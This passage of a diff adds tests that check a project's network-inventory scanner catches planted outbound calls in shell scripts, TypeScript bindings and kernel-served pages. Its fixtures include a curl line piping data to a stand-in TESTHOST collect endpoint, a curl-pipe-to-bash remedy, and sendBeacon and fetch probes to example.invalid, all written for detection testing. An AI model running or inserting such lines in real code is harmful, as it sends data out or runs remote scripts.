@@ -63,6 +63,42 @@ is a site through the JS entry `openExternal`, and `window.open` is a JS tool ra
 is a site with a row (three on the road; the file preview's own-tab open of the kernel's own file URL local). TheClickedLinkRoadIsPinned
 holds the five sites to their rows by execution and the road's residual sentence to its three homes; each tree case is red over a
 scratch copy of the tree with its arm taken out of the script (the round's record names the mutation).
+
+The fourth round of the review (2026-09-23, the landing round again) found four holes in the census's completeness claim and
+one road with no row. The classes below pin the closing of each by execution over the scope copy, and the mutations are
+numbered on from the third round's record (M19 to M25): TheEchoRuleScansTheLiveRemainder, a shell run member, appends seven
+echo-led lines to bin/romp (ECHO_TEXT): the pipe form and the double-quoted substitution form are curl sites, a python3 -c
+substitution is an interpreter site on its row and a node -e one is UNCLASSIFIED, while three copies of the tree's printed
+remedies (a tool inside quotes) list no site, and the tree's four remedy lines, located by content, have no site line (M19:
+the head's one-line skip restored in a scratch copy of the script, none of the four live lines listed).
+TheConnectionFamilyIsReadThroughItsBindings, a browser run member, plants ui/webview/probe-bindings.ts (an inline require's
+get, a renamed destructured request, a ws default import's constructor) and probe-dedupe.ts (a namespace-bound http.get the
+literal list and the arm both match, listed once), and holds the timeline view's two require('http').request calls to their
+local-kernel row by content (M20: the arm's loop emptied, the three lines unlisted and the row stale; M26: the arm's once-per-line
+guard dropped, the doubly matched call two sites and the tree's namespace-bound keys doubled). TheServedPagesAreScanned,
+a run of its own (its import plant would join the credentials run's IMPORT set), plants in kernel/kernel.py a third-party
+fetch, a socket, an opener, a brace-led alert and an import statement in _TIMELINE_BOOT, a sendBeacon in the settings page's
+template, three routes before the /chat branch (a page read from a file the walk does not scan, an f-string page, a page whose
+fetch URL is a Python format slot) and a method serving text/html from a parameter, and holds the shim's and the shell's
+sockets, the boot's dead opener, the worker's clients.openWindow, the four computed fetches and the four pane stylesheets to
+their listing by content (M21: the served pass replaced by pass, the plants unlisted and the three served rows stale).
+TheChatMediaRoadIsRowed holds the chat-media row's two sites (md's and userMd's mdImgPostPass lines) and its five cells by
+content (M22: the T row dropped and the JS pattern's lookbehind removed in one scratch copy, the two lines UNCLASSIFIED, the
+road named with no site and preview.ts's definition line a site). TheGitHubButtonsHrefWriteIsListedByContent holds the file
+viewer's href write to its dom-load line by content (M23: the write deleted, the class count moves; M24: a window.open appended
+to the line, the clicked-link road's count and the file's key move). TheWalkIsRecursiveOverTheDeclaredScope gains
+hooks/probe.bash, a dotted hook outside the five extensions read for its shebang, and TheKindOfReadsADottedHooksShebang holds
+it (M25: kind_of's early return for a dotted name restored, the hook silent). TheClickedLinkRoadIsPinned's residual cases read
+the sentence's third anchor (a message's own same-origin download anchor) and hold the module's constant equal to the
+script's by execution; the window.open key list gains the timeline boot's dead opener in the served text. The docstring
+sentences the round added (the echo rule, the served pages, the refused whole-file scan, the narrowed import gate, the
+keyed-by-tool residual, the named class of stylesheet url() loads and same-origin navigations) are held in
+TheResidualClassIsStatedAndHeld as DISCLOSURE is. Every case is green at the tree; every plant and tree case is red over the
+archive of the round's reviewed head with this module copied in (the shell, browser and served plants silent there at exit 0;
+the chat-media, timeline and served rows absent; the old residual text; the docstring without the round's sentences), and every
+mutation case (M19 to M26) is a case of its own that removes or restores an arm the round added and asserts the shape that
+leaves, so its evidence is the mutation at the tree; over the archive such a case stops at its anchor, since the arm's own line is
+not there, and the plant case beside it carries the archive red.
 """
 import ast
 import difflib
@@ -293,6 +329,8 @@ SUMMARY = re.compile(r"^--- (?P<sites>\d+) sites, (?P<roads>\d+) roads \((?P<loc
                      r"(?P<computed>\d+) browser-computed-url, (?P<dom>\d+) browser-dom-loads; (?P<files>\d+) files scanned, (?P<skipped>\d+) skipped by kind$", re.M)
 FEED_LITERAL = "https://TESTHOST/prices.json"   # a synthetic URL: the bypass the census must catch spells the host as a literal
 SITE_LINE = re.compile(r"^\S+:\d+  ")
+# a dotted hook outside the five extensions, read for its shebang (the fourth round, fresh-2): its curl is a site at its line 2
+BASH_HOOK_TEXT = "#!/usr/bin/env bash\ncurl https://example.invalid/probe\n"
 
 
 def inventory(root, *flags):
@@ -611,6 +649,9 @@ class TheWalkIsRecursiveOverTheDeclaredScope(_SharedRun):
         # shell hook with the ordinary ssh spelling, and a Python fixture below the webview root, which is skipped by kind
         _append("hooks/romp-track-bash-guard.mjs", "fetch(%r);\n" % FEED_LITERAL, cleanup)
         _plant("hooks/probe.sh", "#!/usr/bin/env bash\nssh TESTHOST uptime\n", cleanup)
+        # a dotted hook outside the five extensions (a .bash) is read for its shebang like an undotted one: kind_of's early
+        # return for a dotted name is gone (the fourth round of the review of PR 878, fresh-2)
+        _plant("hooks/probe.bash", BASH_HOOK_TEXT, cleanup)
         _plant("ui/webview/anchor-map-fixtures/probe.py", "import urllib.request\nurllib.request.urlopen(%r)\n" % FEED_LITERAL, cleanup)
         _append("kernel/credentials.py", '\n_PROBE_HOST = "tools/probe-host.mjs"\n', cleanup)
 
@@ -623,6 +664,7 @@ class TheWalkIsRecursiveOverTheDeclaredScope(_SharedRun):
         self.assertRefused(self.rc, out, "UNCLASSIFIED")
         named = unclassified(out)
         self.assertIn("hooks/probe.sh:2", named, "ssh <host> <command> in a shell hook is a site")
+        self.assertIn("hooks/probe.bash:2", named, "a dotted hook outside the five extensions is read for its shebang: a curl in a .bash hook is a site")
         self.assertTrue(any(t.startswith("hooks/romp-track-bash-guard.mjs:") for t in named), "the node hook is scanned: %r" % named)
         self.assertFalse(any("anchor-map-fixtures" in t for t in named), "ui/ is read for the browser kinds only")
         self.assertFalse([ln for ln in out.splitlines() if ln.startswith("PARSE")], "the fixture directory's Python is not parsed:\n" + gates(out))
@@ -786,6 +828,36 @@ DISCLOSURE = ("The shell and browser sides are matched by a named list with no c
               "do not name is no site and no line; the Python side's gate is module-granular: an import outside the allow-list "
               "fails the run, and a primitive of a known module outside NET and SUB is not a site.")
 UNSEEN_LABEL = "a socket primitive on a receiver this scan cannot resolve (not derivable by this scan)"
+# The fourth round's sentences (2026-09-23), one text each with the script's docstring (and, for the first two, SECURITY.md's
+# Network access section, which tests/test_security_price_feed.py holds to the same constants): the echo rule beside the
+# disclosure sentence (correctness-1 and regression-2), the served pages (fresh-1), and the served scan's own statements: the
+# refused whole-file text scan, the narrowed import gate, the keyed-by-tool residual, and the named class it does not count.
+ECHO_RULE = ("An echo- or print-led shell line is skipped as a printed remedy only when nothing live follows the printed text: the text "
+             "outside quotes and the body of every `$(...)` and backtick substitution, wherever it stands, are scanned by the interpreter arm "
+             "and the tool list, so `echo \"$body\" | curl ...` and `echo \"rate: $(curl ...)\"` are sites and a remedy that names a tool "
+             "inside quotes is not.")
+SERVED_PAGES = ("The pages the kernel serves and its service worker's script, from its own string constants (the dashboard shell, the seven "
+                "pane pages, the token login page, the too-large page and /sw.js, with the shim, the timeline boot and the shell scripts they "
+                "inline), are read from kernel.py's syntax tree, each route's page function followed to the constants it returns or inlines, "
+                "and scanned as browser text keyed kernel/kernel.py plus tool, with the DOM loads counted; a route that serves text/html or "
+                "text/javascript from text the extraction cannot read fails the run (SERVED); a file the page reads at run time is covered "
+                "by the walk when it is a scanned kind, and a stylesheet is named, not scanned.")
+SERVED_REFUSED_SCAN = ("The whole of kernel.py is not scanned as text, since a text scan misreads Python and JS concatenations (a Python "
+                       "method spelled like a client, a `from` inside a script split across Python literals).")
+SERVED_IMPORT_GATE = ("Over served text the import gate's statement form applies only to a line that starts with import or export (a line led "
+                      "by a closing brace is a multi-line import's last line in a module and any block's in a page's script), while a literal "
+                      "require() or import() is gated wherever it stands.")
+SERVED_KEYED_RESIDUAL = ("The served pages' rows are keyed by tool (kernel/kernel.py plus WebSocket, window.open or clients.openWindow), so a "
+                         "second socket or opener in the served text is caught by the count per key when it changes the tool and not when it "
+                         "keeps it, as any rowed shell or JavaScript line is (the residual above).")
+SERVED_NAMED_CLASS = ("Named and not counted in the served text: a stylesheet's `url()` loads (THEME_CSS's fonts, _LOADER_CSS's face, "
+                      "_RDRIFT_CSS's and the dashboard shell's own rules, and the pane stylesheets under ui/webview read at run time), every one "
+                      "a `/media` path on the kernel's own origin, and the same-origin navigations no list names (`location.replace` on the token "
+                      "login page, `location.reload` in the shim and the shell, `navigator.serviceWorker.register('/sw.js')`, "
+                      "`history.replaceState`).")
+ROUND_FOUR_SENTENCES = (("the echo rule", ECHO_RULE), ("the served pages", SERVED_PAGES), ("the refused whole-file text scan", SERVED_REFUSED_SCAN),
+                        ("the narrowed import gate over served text", SERVED_IMPORT_GATE), ("the keyed-by-tool residual of the served rows", SERVED_KEYED_RESIDUAL),
+                        ("the named class the served scan does not count", SERVED_NAMED_CLASS))
 
 
 def _inventory_docstring():
@@ -1077,6 +1149,15 @@ class TheResidualClassIsStatedAndHeld(_Scope):
     def test_the_disclosure_sentence_stands_in_the_docstring(self):
         self.assertIn(DISCLOSURE, _inventory_docstring(), "the named lists are disclosed as such after the widening")
 
+    def test_the_fourth_rounds_sentences_stand_in_the_docstring_beside_the_disclosure(self):
+        """The echo rule follows the disclosure sentence (one text with SECURITY.md's copy, held there by tests/test_security_price_feed.py),
+        and the served scan's four statements stand with the served-pages sentence: each a claim the classes below execute."""
+        doc = _inventory_docstring()
+        for name, sentence in ROUND_FOUR_SENTENCES:
+            self.assertIn(sentence, doc, "the docstring states %s in the sentence the tests hold" % name)
+        self.assertEqual(doc[doc.index(DISCLOSURE) + len(DISCLOSURE):].lstrip()[:len(ECHO_RULE)], ECHO_RULE,
+                         "the echo rule is the sentence right after the disclosure sentence: the narrowing of the skip is stated where the closed lists are")
+
 
 class TheHeadsFigureNamesASwappedProgram(_Scope):
     """The committed counts carry the program head per Python command site, so a same-count swap of a local tool for a
@@ -1139,9 +1220,29 @@ class TheGitClassBoundaryIsPinned(_SharedRun):
 # road's label, and its residual sentence, one text with the script's docstring, its trigger cell and SECURITY.md.
 OPEN_EXTERNAL_ENTRY = '("openExternal", r"vscode\\.env\\.openExternal\\("), '
 CLICKED_LABEL = "a link you click (browser)"
-CLICK_RESIDUAL = ("an anchor with no scheme that the chat page's click delegate leaves to the default action (one the page built, or one in a "
-                  "message that does not resolve to a web address) is a gesture this tree does not route, and what the editor's own webview "
-                  "host does with it is outside this tree")
+CLICK_RESIDUAL = ("three anchors the chat page's click delegate leaves to the default action (one with no scheme that the page built; one with "
+                  "no scheme in a message that does not resolve to an http or https address; a message's own download anchor, one with no scheme "
+                  "carrying a `download` attribute whose href resolves to an http or https address on this page's origin, which the browser saves "
+                  "from this origin), and a page-built anchor with a scheme in a document that installs no opener (the gear's sign-in link on the "
+                  "dashboard's settings page and in the editor's feed panel is one), are gestures this tree does not route: on the dashboard the "
+                  "browser's own open or download, and what the editor's own webview host does with them is outside this tree")
+# the third anchor's condition, as render.ts's delegate reads it (the fourth round, tests-2): the words the sentence must carry
+# whatever its spelling, so a rewording that drops the origin condition or the download attribute is red by predicate
+CLICK_RESIDUAL_CONDITION = ("download", "http or https", "this page's origin", "the browser saves")
+
+
+def _script_binding(name):
+    """The script's own value of a module constant, read by importing it in a child interpreter (never from its text, and never
+    in this process: tests/test_state_isolation_order.py reads every in-process load call as a load of romp code, and this
+    module loads none): the one source the docstring, the table cell and the test constants are held to."""
+    prog = ("import importlib.util, json, sys\n"
+            "spec = importlib.util.spec_from_file_location('network_inventory', sys.argv[1])\n"
+            "mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)\n"
+            "print(json.dumps(getattr(mod, sys.argv[2])))\n")
+    p = subprocess.run([sys.executable, "-c", prog, os.path.join(ROOT, INVENTORY), name], capture_output=True, text=True, timeout=60)
+    if p.returncode != 0:
+        raise AssertionError("%s could not be imported to read %s: %s" % (INVENTORY, name, p.stderr[-800:]))
+    return json.loads(p.stdout)
 
 
 class TheClickedLinkRoadIsPinned(_Scope):
@@ -1182,8 +1283,20 @@ class TheClickedLinkRoadIsPinned(_Scope):
         self.assertFalse([ln for ln in out.splitlines() if "  dom-load  window.open  " in ln], "no window.open is counted as a DOM load")
         self.assertClean(rc, out)
         self.assertEqual(sorted(k for k in _expected()["per_key"] if k.endswith(":window.open")),
-                         ["ui/webview/file-view.ts:window.open", "ui/webview/link-opener.ts:window.open", "ui/webview/preview.ts:window.open", "ui/webview/render.ts:window.open"],
-                         "the four window.open lines, each a row key of its own")
+                         ["kernel/kernel.py:window.open", "ui/webview/file-view.ts:window.open", "ui/webview/link-opener.ts:window.open",
+                          "ui/webview/preview.ts:window.open", "ui/webview/render.ts:window.open"],
+                         "the four window.open lines of the bundles, each a row key of its own, and the fifth: the timeline boot's opener in the "
+                         "served text (kernel/kernel.py), reached by no caller at this head and rowed local-kernel (the fourth round, fresh-1)")
+
+    def test_the_residual_constant_is_the_scripts_and_names_the_third_anchors_condition(self):
+        """The fourth round (tests-2): the one sentence in its five homes gained a third anchor, a message's own same-origin download
+        anchor, worded to the delegate's condition (render.ts: no scheme, a `download` attribute, an http or https address on this
+        page's origin); the module's constant is held equal to the script's binding by execution, never by a second spelling."""
+        self.assertEqual(CLICK_RESIDUAL, _script_binding("CLICK_RESIDUAL"), "the module's residual sentence is the script's CLICK_RESIDUAL, read by import")
+        for word in CLICK_RESIDUAL_CONDITION:
+            self.assertIn(word, CLICK_RESIDUAL, "the third anchor's condition names %r (render.ts's delegate: a download attribute and a same-origin "
+                          "http or https address, left to the browser's own download; executed in ui/webview/md-sanitize-chat-schemeless-browser.test.ts)" % word)
+        self.assertEqual(CLICK_RESIDUAL.count("; "), 2, "three anchors of the delegate's, listed in one parenthesis")
 
     def test_the_roads_residual_is_the_docstrings_sentence_and_the_tables(self):
         self.assertIn(CLICK_RESIDUAL, _inventory_docstring(), "the docstring names the gesture the tree does not route")
@@ -1197,6 +1310,407 @@ class TheClickedLinkRoadIsPinned(_Scope):
                                    "vscode-extension/src/extension.ts (`openExternal`)", "the where cell is derived from the sites")
         self.assertIn(CLICK_RESIDUAL, cells[2], "the same sentence, in the road's trigger cell")
         self.assertEqual(cells[4], "none; nothing sends until you click", "no switch: the click is the occasion")
+
+
+# ---- the fourth round of the review (2026-09-23) --------------------------------------------------------------------------
+# D1, the echo rule: seven echo-led lines appended to bin/romp in the shared shell run. The first four are live (a pipe outside the
+# quotes; a curl substitution inside them; a python3 -c and a node -e substitution), the last three are copies of the tree's
+# printed remedies (a tool inside quotes; an escaped quote and an escaped dollar; a substitution whose body names no tool).
+ECHO_TEXT = ('echo "$body" | curl -fsSL -d @- https://TESTHOST/collect\n'
+             'echo "rate: $(curl -fsSL https://TESTHOST/rate)"\n'
+             'echo "$(python3 -c \'import urllib.request; urllib.request.urlopen("https://TESTHOST/x").read()\')"\n'
+             'echo "$(node -e \'fetch("https://TESTHOST/x")\')"\n'
+             'echo "  curl -fsSL https://TESTHOST/bootstrap.sh | bash"\n'
+             'echo "    curl -fsSL <url> | ROMP_DIR=\\"\\$HOME/elsewhere\\" bash" >&2\n'
+             'echo "      forward the port:  ssh -N -L $p:127.0.0.1:$p $(hostname -s 2>/dev/null || echo \'<this-host>\')"\n')
+ECHO_STARTS = (("pipe", 'echo "$body" |'), ("substitution", 'echo "rate: $('), ("python", 'echo "$(python3 -c'), ("node", 'echo "$(node -e'),
+               ("remedy_pipe", 'echo "  curl'), ("remedy_escaped", 'echo "    curl'), ("remedy_ssh", 'echo "      forward'))
+# the tree's four printed remedies, located by content: the pipe or the substitution stands inside the quotes, so none is live
+REMEDY_LINES = (("bin/romp-uninstall", 'bootstrap.sh | bash"'), ("install.sh", 'bootstrap.sh | bash"'),
+                ("bootstrap.sh", 'ROMP_DIR=\\"\\$HOME/elsewhere\\"'), ("bin/romp", "forward the port:"))
+# the script's echo arm (three lines of line_scan) and the one-line skip it replaced, the mutation's text
+ECHO_ARM = ('        if kind == "sh" and s.startswith(("echo ", "print(")):   # a printed remedy is not a request: only what follows the printed text\n'
+            '            live = _live_remainder(s[5:] if s.startswith("echo ") else s[6:])   # live (_live_remainder) is scanned, and a line with nothing live is skipped\n'
+            '            if not live.strip(): continue\n')
+ECHO_SKIP = '        if s.startswith(("echo ", "print(")): continue\n'
+# D2, the binding arm: the three shapes the literal list cannot see (an inline require's member, a renamed destructured member, a
+# ws default import's constructor), and a namespace-bound call both the literal list and the arm match, counted once
+BINDINGS_TEXT = ('import { request as httpRequest } from "http";\nimport WS from "ws";\n\nexport function probeBindings(u: string): void {\n'
+                 '  require("http").get("http://TESTHOST/x");\n  httpRequest({ host: "TESTHOST", port: 80, path: "/x" });\n  const s = new WS(u);\n  void s;\n}\n')
+DEDUPE_TEXT = 'import * as http from "http";\n\nexport function probeDedupe(): void {\n  http.get("http://TESTHOST/x");\n}\n'
+ARM_LINE = "        for tool in _net_sites(live, nb):   # the connection family through the file's bindings: a tool the literal list named on this line is counted once\n"
+ARM_OFF = "        for tool in []:\n"
+TIMELINE_CALL = "require('http').request("
+# E, the served pages: the plants in kernel/kernel.py (each located by content in the copy after every plant has landed)
+BOOT_ANCHOR = "function post(m){api.postMessage(m);}\n"
+BOOT_PLANTS = ('fetch("https://example.invalid/probe");\n'
+               'new WebSocket("wss://example.invalid/");\n'
+               'window.open("https://example.invalid/");\n'
+               "}else{alert('Pull from '+h+' failed');}\n"
+               "import x from 'example-pkg';\n")
+SETTINGS_ANCHOR = '            "<script src=/dist/settings-page.js?v=%d></script></body></html>"'
+SETTINGS_PLANT = '            "<script>navigator.sendBeacon(\'https://example.invalid/t\',\'x\')</script>"\n'
+CHAT_BRANCH = ('            if p == "/chat":\n                _client_seen[0] = time.time()\n'
+               '                return self._send(200, _chat_page(), "text/html; charset=utf-8", cache="no-cache")\n')
+ROUTE_PLANTS = ('            if p == "/probe":\n                return self._send(200, _probe_page(), "text/html; charset=utf-8")\n'
+                '            if p == "/probe-f":\n                return self._send(200, f"<html>{p}<script>fetch(\'https://example.invalid/f\')</script></html>", "text/html")\n'
+                '            if p == "/probe-slot":\n                return self._send(200, "<script>fetch(\'%s\')</script>" % p, "text/html")\n')
+PROBE_PAGE_DEF = '\n\ndef _probe_page():\n    return (UI / "probe.html").read_text()\n'
+SEND_ANCHOR = "    def _send(self, code, body, ctype, cache=None, headers=None):\n"
+SEND_PLANT = "    def _probe_serve(self, body):\n        return self._send(200, body, \"text/html\")\n\n"
+SERVED_CALL = "    for rel, tree, routes in served: served_texts(rel, tree, routes, res)\n"
+SERVED_OFF = "    pass\n"
+# the served text's own sites at the head, located by content in kernel/kernel.py: the shim's and the shell's sockets, the boot's
+# dead opener, the worker's opener (each on the local-kernel row), and the four fetches whose route literal a caller passes
+SERVED_ROWED = (("WebSocket", 'new WebSocket(proto+location.host+"/ws?app='), ("WebSocket", "new WebSocket(proto+location.host+'/ws?app=shell"),
+                ("window.open", 'window.open(url,"_blank")'), ("clients.openWindow", "clients.openWindow(url)"))
+SERVED_COMPUTED = ("fetch(u,{cache", "fetch(path,{method:'POST',headers", "fetch(url).then", "fetch(path,{method:'POST',body")
+PANE_CSS = re.compile(r'\(UI / "webview" / "([a-z]+-pane\.css)"\)\.read_text\(\)')
+# A, the chat-media road: the row's key line and the JS entry (with and without the lookbehind that keeps the definition out)
+CHAT_MEDIA_LABEL = "a rendered message's media (browser)"
+CHAT_MEDIA_ROW = '_t("chat-media", "ui/webview/render.ts:mdImgPostPass")'
+MD_IMG_ENTRY = '("mdImgPostPass", r"(?<!function )\\bmdImgPostPass\\(")'
+MD_IMG_ENTRY_NO_LOOKBEHIND = '("mdImgPostPass", r"\\bmdImgPostPass\\(")'
+# B, the file viewer's GitHub button: its href write, a dom-load line the listing names by content, never by number
+GITHUB_WRITE = 'a.href = url; a.target = "_blank"; a.rel = "noopener";'
+GITHUB_LISTING = re.compile(r'^ui/webview/file-view\.ts:(\d+)  dom-load  attribute write  a\.href = url; a\.target = "_blank"; a\.rel = "noopener";  -> \(browser-dom-loads\)$', re.M)
+# F, kind_of: the shebang read a dotted hook now reaches, and the early return the mutation restores before it
+SHEBANG_LINE = '    with open(path, "rb") as fh: first = fh.readline()   # a dotted name outside those extensions (a .bash hook) is read for its shebang too\n'
+EARLY_RETURN = '    if "." in name: return None\n'
+
+
+def _line_of(path, needle):
+    """The 1-based line of the one line of `path` that carries `needle`; an anchor that is absent or repeated is a broken pin, not a pass."""
+    hits = [i + 1 for i, ln in enumerate(_lines(path)) if needle in ln]
+    if len(hits) != 1:
+        raise AssertionError("the anchor %r occurs %d times in %s, not once" % (needle, len(hits), path))
+    return hits[0]
+
+
+class TheEchoRuleScansTheLiveRemainder(_SharedRun):
+    """An echo- or print-led shell line is skipped as a printed remedy only when nothing live follows the printed text (the fourth
+    round of the review, correctness-1 and regression-2): the text outside the quotes and the body of every $(...) and backtick
+    substitution are scanned by the interpreter arm and the tool list, so `echo "$body" | curl ...` and `echo "rate: $(curl ...)"`
+    are curl sites on bin/romp's row (its committed count moves by two), a python3 -c substitution is an interpreter site on its
+    row (by one) and a node -e one is UNCLASSIFIED, while a remedy that names a tool inside its quotes stays no site: three copies
+    of the tree's own remedy lines list nothing, and the four originals, located by content, have no site line while the tree runs
+    clean. Before the round every such line was skipped whole, so the four live shapes were silent at exit 0. The block is
+    appended to bin/romp in the shared shell run (no other member touches that file); its lines are recorded by content."""
+
+    RUN = "shell"
+
+    @classmethod
+    def mutate(cls, cleanup):
+        lines = _lines(_append("bin/romp", ECHO_TEXT, cleanup))
+        cls.at.update({name: next(i + 1 for i, ln in enumerate(lines) if ln.startswith(start)) for name, start in ECHO_STARTS})
+
+    def test_the_pipe_and_the_substitution_forms_are_sites_and_the_rowed_keys_counts_move(self):
+        at, out = self.at, self.out
+        self.assertRefused(self.rc, out, "UNCLASSIFIED")
+        self.assertListed(out, r"bin/romp:%d  curl  echo \"\$body\" \| curl .*  in -  -> local-kernel$" % at["pipe"], "the pipe form: live text outside the quotes")
+        self.assertListed(out, r"bin/romp:%d  curl  echo \"rate: \$\(curl .*  in -  -> local-kernel$" % at["substitution"], "the substitution's body, inside the quotes, is live")
+        self.assertListed(out, r"bin/romp:%d  python3 -c  .*  in -  -> local-kernel \[external-program\]" % at["python"], "an interpreter substitution is a site on its row, classed")
+        self.assertIn("bin/romp:%d" % at["node"], unclassified(out), "the node -e substitution has no row: UNCLASSIFIED")
+        self.assertListed(out, r"bin/romp:%d  node -e  .*  in -  -> UNCLASSIFIED \[external-program\]" % at["node"])
+        expected = _expected()
+        self.assertRefused(self.rc, out, "COUNTS per_key bin/romp:curl: the committed count is %d, this run found %d"
+                           % (expected["per_key"]["bin/romp:curl"], expected["per_key"]["bin/romp:curl"] + 2),
+                           "COUNTS per_key bin/romp:python3 -c: the committed count is %d, this run found %d"
+                           % (expected["per_key"]["bin/romp:python3 -c"], expected["per_key"]["bin/romp:python3 -c"] + 1),
+                           "COUNTS per_key bin/romp:node -e: the committed count is None, this run found 1")
+
+    def test_a_remedy_that_names_a_tool_inside_its_quotes_is_no_site(self):
+        at, out = self.at, self.out
+        named = unclassified(out)
+        for name in ("remedy_pipe", "remedy_escaped", "remedy_ssh"):
+            self.assertNotIn("bin/romp:%d" % at[name], named, name)
+            self.assertFalse(_listed(out, "bin/romp:%d  " % at[name]), "%s: the tool stands in the printed text, inside the quotes, and is not live" % name)
+
+    def test_the_trees_four_remedy_lines_have_no_site_line_and_the_run_is_clean(self):
+        rc, out, _ = tree_run()
+        self.assertClean(rc, out)
+        for rel, needle in REMEDY_LINES:
+            n = _line_of(os.path.join(ROOT, rel), needle)
+            self.assertFalse(_listed(out, "%s:%d  " % (rel, n)), "%s:%d prints a remedy whose pipe or substitution stands inside the quotes: no site" % (rel, n))
+
+    def test_the_head_skip_restored_leaves_the_live_lines_silent(self):
+        """M19: the one-line skip the round replaced, restored in a scratch copy of the script, skips the four live shapes whole."""
+        lines = self.lines(self.append("bin/romp", ECHO_TEXT))
+        at = {name: next(i + 1 for i, ln in enumerate(lines) if ln.startswith(start)) for name, start in ECHO_STARTS}
+        self.replace(INVENTORY, ECHO_ARM, ECHO_SKIP)
+        rc, out, _ = inventory(scope_copy())
+        for name in ("pipe", "substitution", "python", "node"):
+            self.assertFalse(_listed(out, "bin/romp:%d  " % at[name]), "%s: under the head's skip the live line is silent (the defect the arm closes)" % name)
+        self.assertNotIn("bin/romp:%d" % at["node"], unclassified(out))
+        self.assertNotIn("COUNTS per_key bin/romp:", out, "no bin/romp count moves: the run reads as the tree at exit %d" % rc)
+
+
+class TheConnectionFamilyIsReadThroughItsBindings(_SharedRun):
+    """http, https, net, tls and ws are read through the file's bindings as child_process is (the fourth round, extra6-1): an
+    inline `require("http").get(`, a destructured `request` renamed to httpRequest and a ws default import's `new WS(` are each
+    a site keyed file plus tool (http.get, http.request, WebSocket) with no row, UNCLASSIFIED and no class tag (a connection, not a
+    program); a namespace-bound `http.get(` the literal list and the arm both match is counted once (the dedupe the round
+    required); and the timeline view's two `require('http').request` calls to the kernel on the loopback, no site before the
+    round, sit on their local-kernel row with a committed count of two. The two files are planted in the shared browser run;
+    each case's property is a file's own line, so the run's other blocks (appended to strip.ts) cannot satisfy or fail one."""
+
+    RUN = "browser"
+
+    @classmethod
+    def mutate(cls, cleanup):
+        _plant("ui/webview/probe-bindings.ts", BINDINGS_TEXT, cleanup)
+        _plant("ui/webview/probe-dedupe.ts", DEDUPE_TEXT, cleanup)
+
+    def test_the_three_binding_shapes_are_sites_keyed_by_the_familys_tool(self):
+        out = self.out
+        self.assertRefused(self.rc, out, "UNCLASSIFIED")
+        named = unclassified(out)
+        for line, tool in ((5, "http.get"), (6, "http.request"), (7, "WebSocket")):
+            self.assertIn("ui/webview/probe-bindings.ts:%d" % line, named, tool)
+            self.assertListed(out, r"ui/webview/probe-bindings\.ts:%d  %s  .*  in -  -> UNCLASSIFIED$" % (line, re.escape(tool)), "a connection, not a program: no class tag")
+            self.assertRefused(self.rc, out, "COUNTS per_key ui/webview/probe-bindings.ts:%s: the committed count is None, this run found 1" % tool)
+
+    def test_a_call_the_literal_list_and_the_arm_both_match_is_one_site(self):
+        out = self.out
+        self.assertIn("ui/webview/probe-dedupe.ts:4", unclassified(out))
+        self.assertEqual(len(_listed(out, "ui/webview/probe-dedupe.ts:4  ")), 1, "the namespace-bound http.get lists once:\n" + "\n".join(_listed(out, "ui/webview/probe-dedupe.ts:")))
+        self.assertRefused(self.rc, out, "COUNTS per_key ui/webview/probe-dedupe.ts:http.get: the committed count is None, this run found 1")
+
+    def test_the_dedupe_removed_counts_a_doubly_matched_call_twice(self):
+        """M26: the arm's `seen` guard dropped in a scratch copy of the script: the namespace-bound call is emitted by the literal list
+        and by the arm, so the planted key counts two and the tree's own namespace-bound keys (the manager's, the extension's) move."""
+        self.plant("ui/webview/probe-dedupe.ts", DEDUPE_TEXT)
+        self.replace(INVENTORY, "            if tool not in seen: res.emit(rel, i, tool, s[:70], \"-\", T.get(\"%s:%s\" % (rel, tool)), None, kind)\n",
+                     "            res.emit(rel, i, tool, s[:70], \"-\", T.get(\"%s:%s\" % (rel, tool)), None, kind)\n")
+        rc, out, _ = inventory(scope_copy())
+        self.assertEqual(len(_listed(out, "ui/webview/probe-dedupe.ts:4  ")), 2, "without the guard the one call is two sites")
+        expected = _expected()
+        self.assertRefused(rc, out, "COUNTS per_key ui/webview/probe-dedupe.ts:http.get: the committed count is None, this run found 2",
+                           "COUNTS per_key vscode-extension/src/extension.ts:http.get: the committed count is %d, this run found %d"
+                           % (expected["per_key"]["vscode-extension/src/extension.ts:http.get"], expected["per_key"]["vscode-extension/src/extension.ts:http.get"] * 2))
+
+    def test_the_timeline_views_two_requests_sit_on_the_local_kernel_row(self):
+        rc, out, _ = tree_run()
+        self.assertClean(rc, out)
+        path = os.path.join(ROOT, "ui", "romp-timeline-view.js")
+        lines = [i + 1 for i, ln in enumerate(_lines(path)) if TIMELINE_CALL in ln]
+        self.assertEqual(len(lines), 2, "the view's two require('http').request calls, by content: %r" % lines)
+        for n in lines:
+            self.assertListed(out, r"ui/romp-timeline-view\.js:%d  http\.request  .*  in -  -> local-kernel$" % n, "a site through the inline require, on the row")
+        self.assertEqual(len(re.findall(r"^ui/romp-timeline-view\.js:\d+  http\.request  ", out, re.M)), 2)
+        self.assertEqual(_expected()["per_key"]["ui/romp-timeline-view.js:http.request"], 2, "the row's committed count")
+
+    def test_the_arm_removed_leaves_the_bindings_silent_and_the_row_stale(self):
+        """M20: the arm's loop emptied in a scratch copy of the script: the three planted lines are no site, and the timeline row
+        names none, so the run refuses its stale row and the count."""
+        self.plant("ui/webview/probe-bindings.ts", BINDINGS_TEXT)
+        self.replace(INVENTORY, ARM_LINE, ARM_OFF)
+        rc, out, _ = inventory(scope_copy())
+        for line in (5, 6, 7):
+            self.assertNotIn("ui/webview/probe-bindings.ts:%d" % line, unclassified(out))
+            self.assertFalse(_listed(out, "ui/webview/probe-bindings.ts:%d  " % line), "without the arm the binding shape is silent (the defect)")
+        self.assertRefused(rc, out, "STALE ROW ui/romp-timeline-view.js:http.request names no site",
+                           "COUNTS per_key ui/romp-timeline-view.js:http.request: the committed count is 2, this run found None")
+
+
+class TheServedPagesAreScanned(_SharedRun):
+    """The pages the kernel serves and its service worker's script are scanned as browser text (the fourth round, fresh-1): the
+    routes' `_send` calls with a text/html or text/javascript literal are followed through kernel.py's syntax tree to the constants
+    they inline, and each piece goes through line_scan keyed kernel/kernel.py plus tool. Planted in a copy of kernel/kernel.py: a
+    third-party fetch, a second socket and a second opener in _TIMELINE_BOOT (the fetch UNCLASSIFIED, the two rowed tools moving
+    their keys' counts: the keyed-by-tool residual), a brace-led alert and an import statement there (the narrowed import gate),
+    a sendBeacon in the settings page's template (UNCLASSIFIED at the template's own lines), a route serving a file the walk does
+    not scan and a method serving text/html from a parameter (each a SERVED line by name), an f-string page (its fetch
